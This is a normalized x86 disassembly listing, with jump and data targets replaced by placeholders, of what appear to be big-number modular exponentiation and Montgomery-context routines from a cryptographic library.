mov [ esp + 0x38 ] 0x0
call sub_10020b20
add esp 0xc
test eax eax
jle r-xdata
lea edx [ esp + 0x2c ]
push 0xfe
push edx
push ebx
call sub_10020b20
mov ebp eax
add esp 0xc
test ebp ebp
jg r-xdata
cmp [ esp + eax + 0x2c ] 0x20
jg r-xdata
mov esi [ esp + 0x18 ]
jmp r-xdata
inc eax
mov [ esp + eax + 0x2c ] 0xa
mov [ esp + eax + 0x2d ] 0x0
jmp r-xdata
dec eax
jns r-xdata
sub_1004bee0
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x28 ]
test eax eax
je r-xdata
push 0x7e
push r--data
push 0x93
push 0xba
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
retn
mov edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x8 ]
push 0x0
push edx
push ecx
call eax
add esp 0x10
test eax eax
je r-xdata
mov eax [ esp + 0x4 ]
retn
sub_1004bf30
push ebx
push esi
mov esi [ esp + 0x1c ]
push edi
push esi
xor ebx ebx
call sub_1002dd20
push esi
call sub_1002de70
mov edi eax
add esp 0x8
test edi edi
je r-xdata
push esi
call sub_1002de00
add esp 0x4
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
cmp eax ecx
push esi
jne r-xdata
push ecx
push eax
push edi
call sub_100382b0
add esp 0x10
test eax eax
je r-xdata
push eax
push edi
call sub_1005a220
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x10 ]
push esi
push eax
push edi
push ecx
call sub_1004bfb0
add esp 0x10
test eax eax
je r-xdata
jmp r-xdata
mov ebx 0x1
sub_1004bfb0
mov eax 0x28
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x44 ]
push edi
push esi
mov [ esp + 0x18 ] 0x0
call sub_1002dd20
push esi
call sub_1002de70
mov esi eax
add esp 0x8
test esi esi
mov [ esp + 0x34 ] esi
je r-xdata
mov eax [ esp + 0x48 ]
push eax
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
mov eax [ esp + 0x40 ]
push eax
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebp [ esp + 0x44 ]
mov eax [ ebp ]
mov edi [ ebp + 0x1c ]
cdq
and edx 0x1f
mov [ esp + 0x10 ] edi
add eax edx
mov ebx eax
sar ebx 0x5
je r-xdata
mov [ esi + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x28
retn
test edi edi
je r-xdata
mov ecx [ esi + 0x8 ]
lea eax [ edi + ebx + 0x1 ]
cmp eax ecx
jg r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov edx [ esp + 0x40 ]
mov ecx [ ebp + 0x24 ]
xor ecx [ edx + 0xc ]
mov [ esi + 0xc ] ecx
mov eax [ ebp + 0x18 ]
mov ecx [ esp + 0x10 ]
mov ebp [ esi ]
mov [ esp + 0x18 ] eax
mov eax [ esi + 0x4 ]
lea ecx [ ecx + ebx + 0x1 ]
lea edi [ ebp + edi * 4 ]
cmp eax ecx
jge r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x44 ]
mov [ esi + 0x4 ] ecx
mov ecx [ eax + 0x40 ]
mov eax [ esp + 0x10 ]
test eax eax
mov [ esp + 0x44 ] ecx
jle r-xdata
mov edx [ esi ]
inc eax
cmp eax ecx
mov [ edx + eax * 4 - 0x4 ] 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jle r-xdata
mov [ esp + 0x40 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
jg r-xdata
mov ecx [ esi ]
lea eax [ ecx + eax * 4 - 0x4 ]
mov edx [ ebp ]
imul edx [ esp + 0x44 ]
push edx
push eax
mov eax [ esp + 0x20 ]
push eax
push ebp
call sub_100532d0
mov edx [ edi ]
add edi 0x4
add edx eax
add esp 0x10
mov ecx edx
add ebp 0x4
cmp ecx eax
mov [ edi - 0x4 ] edx
jae r-xdata
mov ebp [ esp + 0x3c ]
sub eax ebx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x44 ] edi
cmp ebx eax
jg r-xdata
mov eax [ esp + 0x3c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
mov edx [ esi + 0x4 ]
dec edx
mov ecx edx
mov [ esi + 0x4 ] edx
test ecx ecx
jg r-xdata
mov eax [ esp + 0x40 ]
dec eax
mov [ esp + 0x40 ] eax
jne r-xdata
mov eax [ edi ]
inc eax
mov [ edi ] eax
jne r-xdata
push ebx
push ebp
call sub_10029af0
add esp 0x8
mov eax ebp
jmp r-xdata
mov [ esp + 0x14 ] 0x1
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
mov eax [ esp + 0x10 ]
mov eax [ edi + 0x4 ]
inc eax
mov [ edi + 0x4 ] eax
jne r-xdata
sub edi ebx
mov eax [ esp + 0x44 ]
sar edi 0x1f
and edi 0x1
push ebx
neg edi
mov ecx edi
mov edx edi
not ecx
and ecx ebx
and edx eax
or ecx edx
mov edx [ esp + 0x48 ]
mov [ ebp + 0x4 ] ecx
mov eax [ esi + 0xc ]
mov [ ebp + 0xc ] eax
mov ecx [ esi ]
mov ebp [ ebp ]
mov esi ebx
sub esi edx
mov edx [ esp + 0x1c ]
lea eax [ ecx + ebx * 4 ]
push edx
sar esi 0x1f
and esi 0x1
push eax
push ebp
mov [ esp + 0x50 ] eax
neg esi
call sub_100537d0
neg eax
or eax edi
sub ebx 0x4
or eax esi
add esp 0x10
not esi
and eax esi
mov esi [ esp + 0x40 ]
mov edx eax
and eax esi
not edx
and edx ebp
xor ecx ecx
or edx eax
test ebx ebx
jle r-xdata
test eax eax
je r-xdata
mov ecx [ edi + 0x8 ]
lea eax [ edi + 0x8 ]
inc ecx
mov [ eax ] ecx
jne r-xdata
add ebx 0x4
cmp ecx ebx
jge r-xdata
mov edi esi
mov [ esp + 0x44 ] esi
sub edi edx
lea ecx [ ebp + 0x4 ]
mov [ esp + 0x1c ] edi
mov edi ebp
sub edi edx
lea eax [ edx + 0x8 ]
mov [ esp + 0x28 ] edi
mov edi esi
sub edi ebp
mov [ esp + 0x14 ] edi
lea edi [ ebx + 0x3 ]
shr edi 0x2
mov [ esp + 0x18 ] edi
shl edi 0x2
mov [ esp + 0x30 ] edi
mov ecx [ eax + 0x4 ]
add eax 0x4
inc ecx
mov [ eax ] ecx
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jle r-xdata
sub edx ebp
sub esi ebp
lea eax [ ebp + ecx * 4 ]
sub ebx ecx
mov edi [ eax - 0x8 ]
add ecx 0x10
mov [ esp + 0x10 ] edi
mov edi [ eax - 0x4 ]
mov [ esp + 0x20 ] edi
mov edi [ eax ]
mov [ esp + 0x24 ] edi
mov [ esi ] 0x0
mov edi [ eax + 0x4 ]
add eax 0x10
mov [ esp + 0x2c ] edi
mov edi [ esp + 0x14 ]
mov [ edi + ecx - 0x10 ] 0x0
mov edi [ esp + 0x10 ]
mov [ ecx - 0x14 ] edi
mov edi [ esp + 0x1c ]
mov [ edi + eax - 0x10 ] 0x0
mov edi [ esp + 0x20 ]
mov [ ecx - 0x10 ] edi
mov edi [ esp + 0x28 ]
mov [ esi + 0xc ] 0x0
mov esi [ esp + 0x24 ]
mov [ edi + eax - 0x10 ] esi
mov esi [ esp + 0x2c ]
mov edi [ esp + 0x18 ]
mov [ ecx - 0x8 ] esi
mov esi [ esp + 0x44 ]
add esi 0x10
dec edi
mov [ esp + 0x44 ] esi
mov [ esp + 0x18 ] edi
jne r-xdata
mov esi [ esp + 0x40 ]
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x3c ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jle r-xdata
mov edx [ eax ]
lea ecx [ edx + ecx * 4 - 0x4 ]
mov ecx [ edx + eax ]
mov [ eax ] ecx
mov [ esi + eax ] 0x0
add eax 0x4
dec ebx
jne r-xdata
mov edx [ eax ]
lea ecx [ edx + ecx * 4 - 0x4 ]
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
test edx edx
jg r-xdata
mov esi [ eax + 0x4 ]
dec esi
mov edx esi
mov [ eax + 0x4 ] esi
test edx edx
jg r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
mov edx [ ecx ]
sub ecx 0x4
test edx edx
jne r-xdata
sub_1004c330
push esi
push 0x21a
push r--data
push 0x48
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
lea eax [ esi + 0x4 ]
mov [ esi ] 0x0
push eax
call sub_10029990
lea ecx [ esi + 0x18 ]
push ecx
call sub_10029990
lea edx [ esi + 0x2c ]
push edx
call sub_10029990
add esp 0xc
mov [ esi + 0x40 ] 0x0
mov [ esi + 0x44 ] 0x1
mov eax esi
pop esi
retn
pop esi
retn
sub_1004c390
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
push eax
call sub_10029950
lea ecx [ esi + 0x18 ]
push ecx
call sub_10029950
lea edx [ esi + 0x2c ]
push edx
call sub_10029950
mov al [ esi + 0x44 ]
add esp 0xc
test al 0x1
je r-xdata
push esi
call sub_1001d740
add esp 0x4
sub_1004c3d0
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x38 ]
push edi
push esi
mov [ esp + 0x14 ] 0x0
call sub_1002dd20
push esi
call sub_1002de70
mov edi eax
add esp 0x8
test edi edi
je r-xdata
mov ecx [ esp + 0x3c ]
push ecx
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov ebx [ esp + 0x34 ]
mov ebp [ esp + 0x38 ]
push ebp
lea eax [ ebx + 0x18 ]
lea esi [ ebx + 0x4 ]
push eax
mov [ esp + 0x3c ] eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
push ebp
mov [ ebx + 0x24 ] 0x0
call sub_10029870
add eax 0x1f
push 0x0
cdq
and edx 0x1f
push esi
add eax edx
sar eax 0x5
shl eax 0x5
mov [ ebx ] eax
call sub_10029cf0
push 0x20
push esi
call sub_1002a0a0
add esp 0x14
test eax eax
je r-xdata
mov eax [ ebp ]
lea edx [ esp + 0x1c ]
xor ebp ebp
push edx
mov ecx [ eax ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x18 ] ecx
call sub_10029990
mov edx [ esp + 0x18 ]
lea eax [ esp + 0x18 ]
xor ecx ecx
cmp edx ebp
mov edx [ esp + 0x40 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push edx
push eax
push esi
setne cl
push edi
mov [ esp + 0x34 ] ecx
mov [ esp + 0x38 ] 0x2
mov [ esp + 0x3c ] ebp
call sub_10036f90
add esp 0x14
test eax eax
je r-xdata
push 0x20
push edi
push edi
call sub_10035e90
add esp 0xc
test eax eax
je r-xdata
cmp [ edi + 0x4 ] ebp
je r-xdata
push 0xffffffff
push edi
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
push 0x1
push edi
call sub_10035be0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push edi
push ebp
push edi
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
cmp [ edi + 0x4 ] ebp
jle r-xdata
xor eax eax
mov eax [ edi ]
mov eax [ eax ]
jmp r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x34 ]
push edx
push eax
push esi
push esi
push ebp
call sub_10057d10
add esp 0x14
test eax eax
je r-xdata
push ebp
push esi
mov [ ebx + 0x40 ] eax
call sub_10029cf0
mov ecx [ ebx ]
shl ecx 0x1
push ecx
push esi
call sub_1002a0a0
add esp 0x10
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x1
sub_1004c570
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
cmp esi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
lea eax [ edi + 0x4 ]
lea ecx [ esi + 0x4 ]
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
lea edx [ edi + 0x18 ]
lea eax [ esi + 0x18 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
lea ecx [ edi + 0x2c ]
lea edx [ esi + 0x2c ]
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
mov [ esi ] eax
mov ecx [ edi + 0x40 ]
mov [ esi + 0x40 ] ecx
pop edi
pop esi
retn
sub_1004c5e0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
push 0x2c3
push r--data
push edi
push 0x5
mov [ esp + 0x20 ] 0x0
call sub_1001f5b0
mov esi [ esp + 0x2c ]
add esp 0x10
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esp + 0x1c ]
mov esi [ eax ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push 0x2c6
push r--data
push edi
push 0x6
call sub_1001f5b0
push 0x2c7
push r--data
push edi
push 0x9
call sub_1001f5b0
mov eax [ esi ]
add esp 0x20
test eax eax
mov [ esp + 0x10 ] 0x1
jne r-xdata
push 0x2d9
push r--data
push edi
push 0x6
call sub_1001f5b0
add esp 0x10
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x2d7
push r--data
push edi
push 0xa
call sub_1001f5b0
add esp 0x10
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push 0x21a
push r--data
push 0x48
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
lea edi [ esi + 0x4 ]
mov [ esi ] 0x0
push edi
call sub_10029990
lea ebp [ esi + 0x18 ]
push ebp
call sub_10029990
lea ebx [ esi + 0x2c ]
push ebx
call sub_10029990
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x30 ]
push eax
push ecx
push esi
mov [ esi + 0x40 ] 0x0
mov [ esi + 0x44 ] 0x1
mov [ esp + 0x2c ] esi
call sub_1004c3d0
add esp 0x18
test eax eax
jne r-xdata
mov edx [ esp + 0x1c ]
mov [ edx ] eax
jmp r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x20 ]
mov [ edx ] eax
jmp r-xdata
push edi
call sub_10029950
push ebp
call sub_10029950
push ebx
call sub_10029950
mov al [ esi + 0x44 ]
add esp 0xc
test al 0x1
je r-xdata
mov edi [ esp + 0x20 ]
push esi
call sub_1001d740
add esp 0x4
sub_1004c750
push ebx
push esi
push edi
mov edi [ esp + 0x18 ]
xor ebx ebx
mov [ edi ] ebx
call sub_100299b0
mov esi eax
test esi esi
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
retn
push 0x1
push esi
call sub_10029cf0
mov ebx [ esp + 0x1c ]
push esi
push ebx
call sub_1002a000
add esp 0x10
test eax eax
jg r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x8 ]
push ecx
push esi
call sub_10029bf0
push 0x1
push esi
call sub_10035be0
push esi
push ebx
call sub_1002a000
add esp 0x18
test eax eax
jl r-xdata
mov eax [ edi ]
or al 0x1
mov [ edi ] eax
push esi
mov edi 0x1
call sub_10029950
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
or al 0x2
mov [ edi ] eax
sub_1004c7d0
mov ecx [ esp + 0x10 ]
push esi
mov eax [ ecx + 0x4 ]
test eax eax
jle r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
mov ecx [ esp + 0x18 ]
push ecx
push edx
push eax
call sub_1004c860
add esp 0x14
pop esi
retn
mov eax [ ecx ]
test [ eax ] 0x1
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ eax + 0x4 ]
cmp edx 0x1
mov edx [ esp + 0x10 ]
jne r-xdata
mov esi [ esp + 0x18 ]
push 0x0
push esi
push ecx
push edx
mov edx [ esp + 0x18 ]
push eax
push edx
call sub_1004cbe0
add esp 0x18
pop esi
retn
mov esi [ eax + 0xc ]
test esi esi
jne r-xdata
push ebx
mov bl [ edx + 0x10 ]
test bl 0x4
pop ebx
jne r-xdata
mov eax [ eax ]
mov esi [ esp + 0x18 ]
push 0x0
push esi
mov eax [ eax ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push eax
push ecx
call sub_1004d520
add esp 0x18
pop esi
retn
sub_1004c860
mov eax 0xc4
call sub_1001d0d0
mov eax [ esp + 0xd0 ]
mov [ esp + 0xc ] 0x0
test [ eax + 0x10 ] 0x4
je r-xdata
push eax
call sub_10029870
add esp 0x4
mov [ esp ] eax
test eax eax
jne r-xdata
push 0xfb
push r--data
push 0x42
push 0x7d
push 0x3
call sub_1001de60
add esp 0x14
or eax 0xffffffff
add esp 0xc4
retn
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xe8 ]
push edi
call sub_1002dd20
push edi
call sub_1002de70
mov ebp eax
push edi
mov [ esp + 0x24 ] ebp
call sub_1002de70
add esp 0xc
mov esi eax
test ebp ebp
mov [ esp + 0x54 ] esi
je r-xdata
mov eax [ esp + 0xc8 ]
push 0x1
push eax
call sub_10029cf0
add esp 0x8
add esp 0xc4
retn
push edi
call sub_1002de00
lea ecx [ esp + 0x24 ]
push ecx
call sub_1005a670
mov eax [ esp + 0x24 ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc4
retn
test esi esi
je r-xdata
lea ecx [ esp + 0x20 ]
push ecx
call sub_1005a640
mov ebx [ esp + 0xe8 ]
add esp 0x4
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push edi
lea eax [ esp + 0x24 ]
push ebx
push eax
call sub_1005a6a0
add esp 0xc
test eax eax
jle r-xdata
push ebx
push ebp
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0xdc ]
push edi
push ebx
push ecx
push esi
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
push edi
lea edx [ esp + 0x24 ]
push ebp
push edx
mov [ ebp + 0xc ] 0x0
call sub_1005a6a0
add esp 0xc
test eax eax
jle r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0x29f
jle r-xdata
mov edx [ esp + 0xd8 ]
push 0x0
push edx
call sub_10029cf0
add esp 0x8
mov [ esp + 0x1c ] 0x1
jmp r-xdata
cmp eax 0xef
jle r-xdata
mov [ esp + 0x14 ] 0x6
jmp r-xdata
cmp eax 0x4f
jle r-xdata
mov [ esp + 0x14 ] 0x5
jmp r-xdata
lea eax [ esp + 0x20 ]
push edi
push eax
push esi
push esi
push ebp
call sub_1005a6f0
add esp 0x14
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x17
setle cl
dec ecx
and ecx 0x2
inc ecx
cmp ecx 0x1
mov [ esp + 0x14 ] ecx
jle r-xdata
mov [ esp + 0x14 ] 0x4
jmp r-xdata
mov ecx [ esp + 0x14 ]
mov ebp 0x1
dec ecx
mov ebx 0x1
shl ebp cl
cmp ebp ebx
jle r-xdata
mov ebp [ esp + 0xd8 ]
lea esi [ eax - 0x1 ]
push 0x1
push ebp
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x18 ] esi
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
lea esi [ esp + 0x58 ]
jmp r-xdata
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push edi
push edx
mov edx [ esi - 0x4 ]
push ecx
push edx
push eax
call sub_1005a6f0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0xe0 ]
push esi
push eax
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
inc ebx
add esi 0x4
cmp ebx ebp
jl r-xdata
mov eax [ esp + 0x14 ]
mov ebx 0x1
mov esi ebx
xor edi edi
cmp eax esi
jle r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
push edi
call sub_1002de70
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
lea eax [ edi + 0x1 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x10 ]
lea ebp [ edx - 0x1 ]
test esi esi
je r-xdata
lea ecx [ esp + 0x20 ]
push edi
push ecx
push ebp
push ebp
push ebp
call sub_1005a6f0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0xe8 ]
lea ecx [ esp + 0x20 ]
sar ebx 0x1
push eax
push ecx
mov edx [ esp + ebx * 4 + 0x5c ]
push edx
push ebp
push ebp
call sub_1005a6f0
add esp 0x14
test eax eax
je r-xdata
xor esi esi
test eax eax
jle r-xdata
mov ebp [ esp + 0xd8 ]
mov eax [ esp + 0xe0 ]
push ebp
push eax
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x1c ] 0x1
jmp r-xdata
dec esi
mov [ esp + 0x10 ] esi
jmp r-xdata
mov edi [ esp + 0xe8 ]
mov ecx [ esp + 0x10 ]
or eax 0xffffffff
sub eax edi
mov [ esp + 0x18 ] 0x0
add ecx eax
mov [ esp + 0x10 ] ecx
jns r-xdata
mov ecx [ esp + 0xe8 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
push ebp
push ebp
push ebp
call sub_1005a6f0
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
inc esi
dec ebp
cmp esi eax
jl r-xdata
mov ecx esi
sub ecx edi
mov edi esi
shl ebx cl
or ebx 0x1
mov esi [ esp + 0x10 ]
mov edi [ esp + 0xe8 ]
mov edi [ esp + 0xe8 ]
inc esi
lea eax [ edi + 0x1 ]
cmp esi eax
jl r-xdata
test ebp ebp
jl r-xdata
sub_1004cbe0
mov eax 0x9c
call sub_1001d0d0
mov eax [ esp + 0xa8 ]
push ebx
push esi
xor esi esi
mov cl [ eax + 0x10 ]
mov [ esp + 0x1c ] esi
test cl 0x4
mov [ esp + 0x8 ] esi
je r-xdata
mov ebx [ esp + 0xb4 ]
cmp [ ebx + 0x4 ] esi
jle r-xdata
mov ecx [ esp + 0xbc ]
mov edx [ esp + 0xb8 ]
push ecx
mov ecx [ esp + 0xb8 ]
push edx
mov edx [ esp + 0xb4 ]
push ecx
push eax
mov eax [ esp + 0xb8 ]
push edx
push eax
call sub_1004d010
add esp 0x18
pop esi
pop ebx
add esp 0x9c
retn
push 0x189
push r--data
push 0x66
push 0x6d
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
pop ebx
add esp 0x9c
retn
mov ecx [ ebx ]
test [ ecx ] 0x1
je r-xdata
push eax
call sub_10029870
add esp 0x4
cmp eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
mov ebp [ esp + 0xbc ]
push edi
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
mov edi eax
push ebp
mov [ esp + 0x20 ] edi
call sub_1002de70
push ebp
mov [ esp + 0x30 ] eax
call sub_1002de70
add esp 0x10
mov esi eax
test edi edi
mov [ esp + 0x2c ] esi
je r-xdata
mov edx [ esp + 0xa8 ]
push 0x1
push edx
call sub_10029cf0
add esp 0x8
pop esi
pop ebx
add esp 0x9c
retn
mov eax [ esp + 0xc4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ebp
call sub_1002de00
mov eax [ esp + 0x28 ]
add esp 0x4
pop edi
pop ebp
pop esi
pop ebx
add esp 0x9c
retn
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
push eax
call sub_1004c390
add esp 0x4
mov eax [ esp + 0xc4 ]
test eax eax
je r-xdata
call sub_1004c330
test eax eax
mov [ esp + 0x10 ] eax
je r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
push ebp
push ebx
push eax
call sub_1004c3d0
add esp 0xc
test eax eax
je r-xdata
mov edi [ esp + 0xb4 ]
mov eax [ edi + 0xc ]
test eax eax
jne r-xdata
push ebp
push ebx
push edi
push esi
call sub_100579b0
add esp 0x10
test eax eax
je r-xdata
push ebx
push edi
call sub_10029fb0
add esp 0x8
test eax eax
jge r-xdata
mov eax esi
mov eax edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
lea edi [ ecx + 0x4 ]
push edi
push eax
push esi
mov [ esp + 0x3c ] edi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0xb0 ]
push 0x0
push eax
call sub_10029cf0
add esp 0x8
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
jne r-xdata
mov ecx [ esp + 0x18 ]
cmp ecx 0x29f
jle r-xdata
mov [ esp + 0x24 ] 0x1
cmp ecx 0xef
jle r-xdata
mov [ esp + 0x1c ] 0x6
jmp r-xdata
cmp ecx 0x4f
jle r-xdata
mov [ esp + 0x1c ] 0x5
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push ebp
push ecx
push esi
push esi
push edx
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp ecx 0x17
setle al
dec eax
and eax 0x2
inc eax
cmp eax 0x1
mov [ esp + 0x1c ] eax
jle r-xdata
mov [ esp + 0x1c ] 0x4
jmp r-xdata
mov eax [ esp + 0x1c ]
mov edi 0x1
mov ebx 0x1
lea ecx [ eax - 0x1 ]
shl edi cl
cmp edi ebx
jle r-xdata
mov edx [ esp + 0x10 ]
push ebp
lea esi [ ecx - 0x1 ]
push edx
push edi
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x24 ] esi
call sub_10029810
mov edi [ esp + 0x2c ]
push eax
push edi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov edi [ esp + 0x28 ]
mov ecx [ esp + 0x18 ]
lea esi [ esp + 0x30 ]
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
push ebp
push ecx
mov ecx [ esi - 0x4 ]
push edx
push ecx
push eax
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0xb8 ]
push esi
push eax
call sub_1002a150
add esp 0x8
test eax eax
jne r-xdata
inc ebx
add esi 0x4
cmp ebx edi
jl r-xdata
mov eax [ esp + 0x1c ]
mov edi 0x1
mov esi edi
xor ebx ebx
cmp eax esi
jle r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
push ebp
call sub_1002de70
add esp 0x4
mov [ esi ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x14 ]
lea eax [ ebx + 0x1 ]
test ecx ecx
jne r-xdata
mov edx [ esp + 0x18 ]
lea ebp [ edx - 0x1 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push ecx
push edi
push edi
push edi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov esi [ esp + 0x20 ]
test eax eax
mov [ esp + 0x14 ] 0x0
jle r-xdata
mov ebp [ esp + 0xc0 ]
mov eax [ esp + 0xb8 ]
push ebp
push eax
call sub_1002a150
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xb0 ]
push ebp
push edx
push edi
push eax
call sub_1004bfb0
add esp 0x10
test eax eax
je r-xdata
dec esi
mov [ esp + 0x18 ] esi
jmp r-xdata
mov eax [ esp + 0x18 ]
or ecx 0xffffffff
sub ecx ebx
mov [ esp + 0x14 ] 0x0
add eax ecx
mov [ esp + 0x18 ] eax
jns r-xdata
mov ecx [ esp + 0x10 ]
mov esi [ esp + 0x20 ]
push ebp
push ecx
push esi
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
inc esi
dec ebp
cmp esi eax
jl r-xdata
mov ecx esi
sub ecx ebx
mov ebx esi
shl edi cl
or edi 0x1
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x20 ]
mov edi [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
lea ecx [ ebx + 0x1 ]
inc eax
cmp eax ecx
mov [ esp + 0x14 ] eax
jl r-xdata
test ebp ebp
jl r-xdata
jmp r-xdata
mov edx [ esp + 0x10 ]
push ebp
sar edi 0x1
push edx
mov eax [ esp + edi * 4 + 0x34 ]
push eax
push esi
push esi
call sub_1004bf30
add esp 0x14
test eax eax
je r-xdata
sub_1004d010
mov eax 0x28
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x40 ]
push esi
push edi
xor esi esi
mov eax [ ebp ]
mov edi [ ebp + 0x4 ]
mov [ esp + 0x30 ] esi
mov [ esp + 0x10 ] esi
mov cl [ eax ]
mov [ esp + 0x2c ] esi
test cl 0x1
mov [ esp + 0x28 ] esi
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x1c ] edi
jne r-xdata
mov ecx [ esp + 0x44 ]
push ecx
call sub_10029870
mov ebx eax
add esp 0x4
test ebx ebx
mov [ esp + 0x34 ] ebx
jne r-xdata
push 0x252
push r--data
push 0x66
push 0x7c
push 0x3
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x28
retn
mov eax [ esp + 0x4c ]
push eax
call sub_1002dd20
